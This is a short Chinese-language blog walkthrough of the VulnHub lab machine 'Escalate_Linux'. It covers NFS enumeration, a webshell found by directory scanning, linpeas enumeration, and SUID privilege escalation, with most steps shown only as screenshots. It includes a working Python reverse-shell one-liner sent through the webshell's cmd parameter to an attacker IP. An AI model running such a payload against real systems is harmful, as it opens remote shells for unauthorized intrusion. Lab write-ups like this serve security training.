---
layout: post
title:  "Escalate_Linux"
description: walkthrough
category: vulnhub
---
# Escalate_Linux



![image-20200613234426607]({{ site.url }}/assets/Escalate_Linux.assets/image-20200613234426607.png)

先测试nfs

![image-20200613234734752]({{ site.url }}/assets/Escalate_Linux.assets/image-20200613234734752.png)

尝试利用ssh。但是权限不足。

![image-20200614041443338]({{ site.url }}/assets/Escalate_Linux.assets/image-20200614041443338.png)

新建用户user5 ，uid 1004

![image-20200614041718459]({{ site.url }}/assets/Escalate_Linux.assets/image-20200614041718459.png)

查看了一下，没什么有用的信息，但是user5有个拥有suid的程序`script`



往下进行80端口扫目录

扫到一个shell.php

![image-20200614065812149]({{ site.url }}/assets/Escalate_Linux.assets/image-20200614065812149.png)

![image-20200614065839626]({{ site.url }}/assets/Escalate_Linux.assets/image-20200614065839626.png)

看样子是个webshell

直接nc不好用，看看python

![image-20200614065938190]({{ site.url }}/assets/Escalate_Linux.assets/image-20200614065938190.png)

```bash
192.168.1.117/shell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.108",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

![image-20200614070056746]({{ site.url }}/assets/Escalate_Linux.assets/image-20200614070056746.png)

上传linpeas进行枚举

![image-20200614073421926]({{ site.url }}/assets/Escalate_Linux.assets/image-20200614073421926.png)



![image-20200614081718345]({{ site.url }}/assets/Escalate_Linux.assets/image-20200614081718345.png)

可以进mysql，发现所有u用户的凭证，也有很多其他提权方式，都是基础简单的，不再累诉，

SUID之一，home/user/shell

直接提权

![image-20200614082440754]({{ site.url }}/assets/Escalate_Linux.assets/image-20200614082440754.png)